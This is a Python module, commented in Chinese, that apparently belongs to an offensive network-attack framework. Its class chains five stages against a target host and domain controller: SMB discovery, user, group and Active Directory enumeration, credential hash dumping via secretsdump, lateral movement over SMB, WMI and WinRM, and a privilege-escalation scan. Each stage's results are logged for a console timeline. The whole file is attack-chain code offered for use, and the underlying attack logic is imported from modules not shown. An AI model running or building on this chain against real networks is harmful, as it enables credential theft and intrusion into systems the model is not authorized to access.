# -*- coding: utf-8 -*-
"""attack_chain.py — 内网攻击链编排。

把 发现 → 枚举 → 凭据 → 横向 → 提权 五段串成一条攻击链，
逐步执行并记录每段输入/输出/状态，供控制台时间线展示。
"""
from __future__ import annotations

from datetime import datetime
from typing import Any, Dict, List

from .smb_enum import get_smb_enumerator
from .ad_query import get_ad_querier
from .cred_extract import get_cred_extractor
from .lateral_movement import get_lateral_mover
from .privesc_detector import get_privesc_detector


STAGES = ["discovery", "enumeration", "credential", "lateral", "privesc"]


class InternalAttackChain:
    """内网攻击链编排器。"""

    def __init__(self) -> None:
        self.smb = get_smb_enumerator()
        self.ad = get_ad_querier()
        self.cred = get_cred_extractor()
        self.move = get_lateral_mover()
        self.priv = get_privesc_detector()
        self._history: List[Dict[str, Any]] = []

    def run(self, *, target: str, dc: str = "",
            user: str = "", password: str = "",
            timeout: int = 300) -> Dict[str, Any]:
        chain: List[Dict[str, Any]] = []

        # 1. 发现（discovery）：SMB 端口与基本服务枚举
        s0 = {
            "stage": "discovery",
            "ts": datetime.utcnow().isoformat() + "Z",
            "action": "smb_port_probe",
            "input": {"host": target},
            "output": self.smb.list_shares(target, user, password, timeout),
        }
        chain.append(s0)

        # 2. 枚举（enumeration）：SMB 用户/组 + AD 查询
        s1 = {
            "stage": "enumeration",
            "ts": datetime.utcnow().isoformat() + "Z",
            "action": "smb_users_groups + ad_query",
            "input": {"host": target, "dc": dc},
            "output": {
                "smb_users": self.smb.list_users(target, user, password, timeout),
                "smb_groups": self.smb.list_groups(target, user, password, timeout),
                "ad": self.ad.full_query(dc, user, password, timeout) if dc else {"skipped": True},
            },
        }
        chain.append(s1)

        # 3. 凭据（credential）：哈希 dump
        s2 = {
            "stage": "credential",
            "ts": datetime.utcnow().isoformat() + "Z",
            "action": "secretsdump",
            "input": {"target": target},
            "output": self.cred.full_extract(target, user, password, timeout),
        }
        chain.append(s2)

        # 4. 横向（lateral）：SMB/WMI/WinRM
        s3 = {
            "stage": "lateral",
            "ts": datetime.utcnow().isoformat() + "Z",
            "action": "smb_wmi_winrm_move",
            "input": {"target": target, "user": user or "guest"},
            "output": self.move.full_move(target, user or "guest", password,
                                          "whoami", timeout),
        }
        chain.append(s3)

        # 5. 提权（privesc）：本机提权检测
        s4 = {
            "stage": "privesc",
            "ts": datetime.utcnow().isoformat() + "Z",
            "action": "local_privesc_scan",
            "input": {"host": target},
            "output": self.priv.full_scan(timeout),
        }
        chain.append(s4)

        summary = {
            "chain_id": datetime.utcnow().strftime("%Y%m%d%H%M%S"),
            "target": target,
            "dc": dc,
            "ts": datetime.utcnow().isoformat() + "Z",
            "stages_total": len(STAGES),
            "chain": chain,
            "status": "completed",
        }
        self._history.append(summary)
        return summary

    def history(self) -> List[Dict[str, Any]]:
        return list(self._history)

    def latest(self) -> Dict[str, Any] | None:
        return self._history[-1] if self._history else None


_singleton: InternalAttackChain | None = None


def get_attack_chain() -> InternalAttackChain:
    global _singleton
    if _singleton is None:
        _singleton = InternalAttackChain()
    return _singleton
